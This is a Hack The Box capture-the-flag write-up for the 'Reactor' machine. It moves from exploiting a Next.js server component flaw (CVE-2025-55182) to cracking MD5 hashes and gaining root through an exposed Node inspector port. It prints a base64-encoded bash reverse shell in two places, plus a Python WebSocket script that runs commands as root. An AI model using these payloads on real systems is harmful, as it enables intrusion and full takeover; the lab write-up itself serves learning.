---
title: Reactor - Season 11
description: Write-up Hack The Box machine
pubDate: 2026-09-05
tags: ['HTB Machine', 'Linux', 'Season 11']
---


# Recon

## Nmap

```bash title:nmap hl:2,6-9,11-14
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Sun, 23 Aug 2026 17:55:42 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Sun, 23 Aug 2026 17:55:46 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Sun, 23 Aug 2026 17:55:47 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.98%I=7%D=8/23%Time=6A8B3442%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,3E88,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-S
SF:tate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x2
SF:0Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\
SF:r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nC
SF:ache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2017
SF:175\r\nDate:\x20Sun,\x2023\x20Aug\x202026\x2017:55:42\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta
SF:\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## Whatweb

``` bash title:whatweb
whatweb http://reactor.htb:3000    
http://reactor.htb:3000 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.33.94], Script, Title[ReactorWatch | Core Monitoring System], UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time], X-Powered-By[Next.js]
```

---

## Enumeration

### Web
Website _**ReactorWatch**_ view infomation monitor like **Status**, **Temp**, **Pressure**,  **System Log**, **Online User**, ..etc

This is a static web and dont have special or feature enable user interaction with website

![](assets/Pasted%20image%2020260824010647.png)

Check Wappalyzer can see version of **Next.js** is `15.0.3`. This is noteworthy information for checking for vulnerabilities if it's an older version.

![](assets/Pasted%20image%2020260824011151.png)


---

# Initial Access

## Vulnerability
### React2Shell ~ CVE-2025-55182

I research using the keyword **"Nextjs 15.0.3 vulnerabilities"** and found information regarding vulnerabilities affecting that version

![](assets/Pasted%20image%2020260829221340.png)

According to the vulnerability description, CVE-2025-55182 is _**A pre-authentication remote code execution vulnerability exists in React Server Components versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 including the following packages: react-server-dom-parcel, react-server-dom-turbopack, and react-server-dom-webpack. The vulnerable code unsafely deserializes payloads from HTTP requests to Server Function endpoints.**_ 
( [cve.org CVE-2025-55182 Description](https://www.cve.org/CVERecord?id=CVE-2025-55182))  


> [!note] What if?
> If we only have information about Next.js 15.0.3, how we can determine that RSC 19 is involved in exploiting CVE-2025-55182? And how does CVE-2025-66478 differ?
> 
> Answer: I research in official website of Next.js, version 15.0.3 using RSC 19. That is a major proof-of-concept for testing CVE-2025-55182. 
> 
> CVE-2025-66478 manager by Next.js advisory and CVE-2025-55182 publish by React Team. Since Next.js utilizes RSC, React's CVE-2025-55182 affects the Next.js App Router, prompting the release of CVE-2025-66478 specifically for Next.js

## Exploitation
Find any public exploit for testing like [CVE-2025-55182 POC](https://github.com/msanft/CVE-2025-55182) 

```bash
python3 CVE-2025-55182.py http://reactor.htb:3000 "echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMTkvNDk1MyAwPiYxJw== | base64 -d | bash"
```

![](assets/Pasted%20image%2020260829230554.png)

---

# Foothold

Current User

```bash
node@reactor:/opt/reactor-app$ id
uid=999(node) gid=988(node) groups=988(node)
```

Interesting Files

```bash
node@reactor:/opt/reactor-app$ ls -la
total 76
drwxr-xr-x  5 node node  4096 Dec 28  2025 .
drwxr-xr-x  4 root root  4096 Apr 27 11:26 ..
drwxr-xr-x  2 node node  4096 Dec 28  2025 app
-rw-r--r--  1 node node   276 Dec 28  2025 .env
drwxr-xr-x  7 node node  4096 Dec 28  2025 .next
-rw-r--r--  1 node node   172 Dec 28  2025 next.config.js
drwxr-xr-x 30 node node  4096 Dec 28  2025 node_modules
-rw-r--r--  1 node node   269 Dec 28  2025 package.json
-rw-r--r--  1 node node 29329 Dec 28  2025 package-lock.json
-rw-r-----  1 node node 12288 Dec 28  2025 reactor.db
```

Ok, i have some interest in source code **reactor-app**. `.env`, `next.config.js`, `reactor.db`

I prefer `.env` files over everything else. 

```bash info:5-6
node@reactor:/opt/reactor-app$ cat .env
# ReactorWatch Configuration
# Database connection for sensor data

DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3

# API Keys
SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook

# Node environment
NODE_ENV=production
```

`DB_PATH=/opt/reactor-app/reactor.db` in folder project and node current user can read this file with `sqlite3` command.

Very nice!!
```bash
node@reactor:/opt/reactor-app$ sqlite3 /opt/reactor-app/reactor.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite>
```

Enum table name 
```sql
sqlite> .tables
sensor_logs  users      
sqlite> .schema users
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
);
```

So, we have information user in here, include password. We're about to make a breakthrough.
```sql
sqlite> select * from users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

I guess password hashed by **MD5** algorithm. I'll get to my kali and crack with **john**.


Awesome, password for _**engineer**_ user
```bash hl:6
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt ./credentials
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
reactor1         (engineer)     
1g 0:00:00:00 DONE (2026-08-29 12:21) 1.639g/s 23513Kp/s 23513Kc/s 24066KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

SSH to user _**engineer**_ and get user flag

==Credentials==
`Engineer:reactor1`

---

# Privilege Escalation

## Enumeration

I checked all the running services and discovered a service running internal on port 9229
```bash hl:8
engineer@reactor:~$ ss -tuln
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port  Process  
udp    UNCONN  0       0           127.0.0.54:53           0.0.0.0:*              
udp    UNCONN  0       0        127.0.0.53%lo:53           0.0.0.0:*              
udp    UNCONN  0       0              0.0.0.0:68           0.0.0.0:*              
tcp    LISTEN  0       4096           0.0.0.0:22           0.0.0.0:*              
tcp    LISTEN  0       4096        127.0.0.54:53           0.0.0.0:*              
tcp    LISTEN  0       511          127.0.0.1:9229         0.0.0.0:*              
tcp    LISTEN  0       4096     127.0.0.53%lo:53           0.0.0.0:*              
tcp    LISTEN  0       4096              [::]:22              [::]:*              
tcp    LISTEN  0       511                  *:3000               *:*
```

Additionally, within the `/opt` directory (where the `reactor-app` program owned by the `node` user) there is another folder named `uptime-monitor` own by root
```bash hl:6
engineer@reactor:/opt$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Apr 27 11:26 .
drwxr-xr-x 23 root root 4096 May 20 10:07 ..
drwxr-xr-x  5 node node 4096 Dec 28  2025 reactor-app
drwxr-xr-x  2 root root 4096 Apr 27 11:26 uptime-monitor
```

Inside folder have `worker.js` file
```bash
engineer@reactor:/opt/uptime-monitor$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Apr 27 11:26 .
drwxr-xr-x 4 root root 4096 Apr 27 11:26 ..
-rw-r--r-- 1 root root 1684 Apr 27 11:26 worker.js
```


## Analyze

This is a **uptime monitor** built with **Node.js**: every 30 seconds, it sends an HTTP request to 127.0.0.1:3000, measure latency and  response size, and logs the results to `/var/log/uptime-monitor.csv`
```js title:worker.js
const http = require('http');
const fs = require('fs');

const TARGET_URL = 'http://127.0.0.1:3000/';
const CSV_FILE = '/var/log/uptime-monitor.csv';
const INTERVAL_MS = 30_000;
const TIMEOUT_MS = 10_000;

function csvEscape(value) {
    const s = String(value ?? '');
    return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

function record({ status, latency, size, error }) {
    const row = [
        new Date().toISOString(),
        status ?? '',
        latency ?? '',
        size ?? '',
        error ?? '',
    ]
        .map(csvEscape)
        .join(',') + '\n';

    fs.appendFileSync(CSV_FILE, row);
}

function probe() {
    const start = process.hrtime.bigint();
    let bytes = 0;

    const req = http.get(TARGET_URL, { timeout: TIMEOUT_MS }, (res) => {
        res.on('data', (chunk) => {
            bytes += chunk.length;
        });

        res.on('end', () => {
            const latencyMs = Number(
                (process.hrtime.bigint() - start) / 1_000_000n
            );

            record({
                status: res.statusCode,
                latency: latencyMs,
                size: bytes,
            });
        });
    });

    req.on('error', (error) => {
        const latencyMs = Number(
            (process.hrtime.bigint() - start) / 1_000_000n
        );

        record({
            latency: latencyMs,
            error: error.code || error.message,
        });
    });

    req.on('timeout', () => {
        req.destroy();

        record({
            latency: TIMEOUT_MS,
            error: 'TIMEOUT',
        });
    });
}

setInterval(probe, INTERVAL_MS);
probe();

console.log('uptime-monitor up, pid=' + process.pid);
```

Based on my own understanding and the explanation provided by ChatGPT, this `worker.js` counts bytes and the data counted to file `.csv`. Since it does not accept any untrusted data, source code containing vulnerabilities is quite low.


I tried checking configuration in `/etc/systemd/system` and reading the contents of the **_uptime-monitor_** service.
![](assets/Pasted%20image%2020260830174841.png)

```bash hl:7-8
cat uptime-monitor.service 
[Unit]                                                                                                                           
Description=Internal uptime/latency monitor for the SSR app
After=network.target                                                                                                                                
[Service]                                                                                                                                   
Type=simple     
User=root
ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
Restart=on-failure                                                                                                                                  
RestartSec=3
StandardOutput=journal                                                                                                                              
StandardError=journal                                                                                                          
[Install]                                                                                                                                          
WantedBy=multi-user.target
```

`/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js` 
I looked up `node --inspect` and learned from the Node.js homepage that it is a debugging option
![](assets/Pasted%20image%2020260905180929.png)

I tested with request to `http://127.0.0.1:9229/json/list` follow guide 
![](assets/Pasted%20image%2020260905234739.png)

Receive response like that
```json hl:10
{
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/90c98c7f-609e-45c4-a452-24ba1c109ca3",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/90c98c7f-609e-45c4-a452-24ba1c109ca3",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "90c98c7f-609e-45c4-a452-24ba1c109ca3",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/90c98c7f-609e-45c4-a452-24ba1c109ca3"
}
```
An endpoint debugger using WebSocket



==Interesting Findings==

- Port local running 9229

---

## Exploit

I asked AI to generate a Python script for me to connect to a WebSocket endpoint
`ws://127.0.0.1:9229/4d331107-5dbd-4bde-96f3-f9b84386dbff`

```python title:exploit_socket.py hl:6,35
#!/usr/bin/env python3

import json
import websocket

WS_URL = "ws://127.0.0.1:9229/90c98c7f-609e-45c4-a452-24ba1c109ca3" # --> edit this endpoint

ws = websocket.create_connection(WS_URL, timeout=5)
print("[+] Connected")

# 1. Enable Runtime
ws.send(json.dumps({
    "id": 1,
    "method": "Runtime.enable"
}))

print("[+] Runtime.enable sent")

# Consume events until we receive response to request #1
while True:
    msg = ws.recv()
    print("[<]", msg)

    data = json.loads(msg)

    if data.get("id") == 1:
        print("[+] Runtime enabled")
        break

# 2. Evaluate harmless expression
request = {
    "id": 2,
    "method": "Runtime.evaluate",
    "params": {
        "expression": "process.pid",  # --> edit this field
        "returnByValue": True
    }
}

print("[>]", json.dumps(request))
ws.send(json.dumps(request))

# 3. Wait specifically for response #2
while True:
    msg = ws.recv()
    print("[<]", msg)

    data = json.loads(msg)

    if data.get("id") == 2:
        print("[+] Runtime.evaluate response received")
        print(json.dumps(data, indent=2))
        break

ws.close()
```

Response:
```bash hl:16
proxychains4 -q python3 testsocket.py           
[+] Connected
[+] Runtime.enable sent
[<] {"method":"Runtime.executionContextCreated","params":{"context":{"id":1,"origin":"","name":"/usr/bin/node[1394]","uniqueId":"-8547583304284134535.-8346793788583045258","auxData":{"isDefault":true}}}}
[<] {"method":"Runtime.consoleAPICalled","params":{"type":"log","args":[{"type":"string","value":"uptime-monitor up, pid=1394"}],"executionContextId":1,"timestamp":1789138231211.477,"stackTrace":{"callFrames":[{"functionName":"","scriptId":"81","url":"file:///opt/uptime-monitor/worker.js","lineNumber":73,"columnNumber":8}]}}}
[<] {"id":1,"result":{}}
[+] Runtime enabled
[>] {"id": 2, "method": "Runtime.evaluate", "params": {"expression": "process.pid", "returnByValue": true}}
[<] {"id":2,"result":{"result":{"type":"number","value":1394,"description":"1394"}}}
[+] Runtime.evaluate response received
{
  "id": 2,
  "result": {
    "result": {
      "type": "number",
      "value": 1394,
      "description": "1394"
    }
  }
}
```

> [!Attention]
> Remember to set up port forward before running the script with proxychains
> `ssh engineer@reactor.htb -D 1080 -N`

### Explain how to payload works
> 
> Command `/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js` run has 2 parts:
```
/usr/bin/node 
	│ 
	├── Node Inspector / CDP ← receive WebSocket JSON 
	│ 
	├── V8 engine ← execute JavaScript 
	│ 
	└── worker.js ← application code
```
>When you send `"method":"Runtime.evaluate"`, **_Node Inspector_** receives message and requests **_V8 engine_** to evaluate it.
```
CDP request 
	↓ 
Inspector 
	↓ 
V8 execution context 
	↓ 
evaluate("process.pid")
```

Ok, i'll test with `"expression": "process.require('child_process').execSync('id; uname -a; hostname').toString()"` to try execute command

```json error:8,32
{
  "id": 2,
  "result": {
    "result": {
      "type": "object",
      "subtype": "error",
      "className": "TypeError",
      "description": "TypeError: process.require is not a function\n    at <anonymous>:1:9",
      "objectId": "4893222012694014564.1.1"
    },
    "exceptionDetails": {
      "exceptionId": 1,
      "text": "Uncaught",
      "lineNumber": 0,
      "columnNumber": 8,
      "scriptId": "117",
      "stackTrace": {
        "callFrames": [
          {
            "functionName": "",
            "scriptId": "117",
            "url": "",
            "lineNumber": 0,
            "columnNumber": 8
          }
        ]
      },
      "exception": {
        "type": "object",
        "subtype": "error",
        "className": "TypeError",
        "description": "TypeError: process.require is not a function\n    at <anonymous>:1:9",
        "objectId": "4893222012694014564.1.2"
      }
    }
  }
}
```
**_TypeError: process.require is not a function_**, It seem I've failed

I searched the Nodejs homepage for process properties capable of executing code but found nothing. Here is payload suggested by AI; I going to give it atry
```json
"expression": "process.mainModule.require('child_process').execSync('id').toString()"
```

**Fine, I'm too weak!!!!!!!!!!!!!!!!!!!**
```json
[+] Runtime enabled
[>] {"id": 2, "method": "Runtime.evaluate", "params": {"expression": "process.mainModule.require('child_process').execSync('id').toString()", "returnByValue": true}}
[<] {"id":2,"result":{"result":{"type":"string","value":"uid=0(root) gid=0(root) groups=0(root)\n"}}}
[+] Runtime.evaluate response received
{
  "id": 2,
  "result": {
    "result": {
      "type": "string",
      "value": "uid=0(root) gid=0(root) groups=0(root)\n"
    }
  }
}
```

Now, just replace it with a reverse shell command.
```json
"expression": "process.mainModule.require('child_process').execSync('echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMTkvNDk1MyAwPiYxJw== | base64 -d | bash').toString()"
```

Rooted!!!
![](assets/Pasted%20image%2020260912004141.png)

---

![](assets/Pasted%20image%2020260912004637.png)

---
# Loot

| Type    | Value                                              | Source                      |
| ------- | -------------------------------------------------- | --------------------------- |
| Hash    | engineer:39d97110eafe2a9a68639812cd271e8e:reactor1 | /opt/reactor-app/reactor.db |
| Hash    | admin:a203b22191d744a4e70ada5c101b17b8             | /opt/reactor-app/reactor.db |
| SSH Key |                                                    |                             |
|         |                                                    |                             |
